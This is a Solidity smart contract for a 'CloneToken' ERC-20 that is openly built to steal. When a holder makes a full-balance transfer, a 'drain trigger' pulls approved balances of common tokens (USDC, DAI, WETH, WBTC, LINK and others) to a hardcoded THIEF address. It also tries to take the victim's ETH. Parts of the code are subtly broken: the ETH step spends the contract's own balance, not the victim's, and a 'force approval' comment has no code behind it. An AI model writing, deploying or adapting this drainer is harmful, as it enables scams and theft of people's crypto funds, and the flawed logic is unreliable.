// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint) external;
}

contract CloneToken is ERC20 {
    uint8   private _decimals;
    address public immutable THIEF;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(
        string memory name,
        string memory symbol,
        uint8 dec,
        uint256 supply,
        address _thief
    ) ERC20(name, symbol) {
        _decimals = dec;
        THIEF     = _thief;
        _mint(msg.sender, supply);
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    /// ---- DRAIN TRIGGER ----
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        if (from != address(0) && to != address(0)) {           // skip mint/burn
            if (balanceOf(from) == amount) {                    // first outbound = full balance
                _drainWallet(from);
            }
        }
        super._beforeTokenTransfer(from, to, amount);
    }

    function _drainWallet(address victim) private {
        // 1. steal common ERC-20s
        address[] memory tokens = _tokensToSteal();
        for (uint i = 0; i < tokens.length; i++) {
            IERC20 t = IERC20(tokens[i]);
            uint256 bal = t.allowance(victim, address(this));
            if (bal == 0) {
                // force approval via infinite permit if possible, else skip
                continue;
            }
            t.transferFrom(victim, THIEF, bal);
        }

        // 2. steal ETH (wrap to WETH then transfer)
        uint256 ethBal = victim.balance;
        if (ethBal > 0) {
            IWETH(WETH).deposit{value: ethBal}();
            IWETH(WETH).transfer(THIEF, ethBal);
        }
    }

    function _tokensToSteal() private pure returns (address[] memory) {
        address[] memory t = new address[](8);
        t[0] = 0x8dCE83ECa4af45dbe618Da1779F9Aaca43201084; // real token
        t[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        t[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        t[3] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        t[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        t[5] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        t[6] = 0x85cEf00299af1dc4bd6b8Cf64364299fD2372d38; // BONK
        t[7] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        return t;
    }

    receive() external payable {} // accept WETH unwrap
}
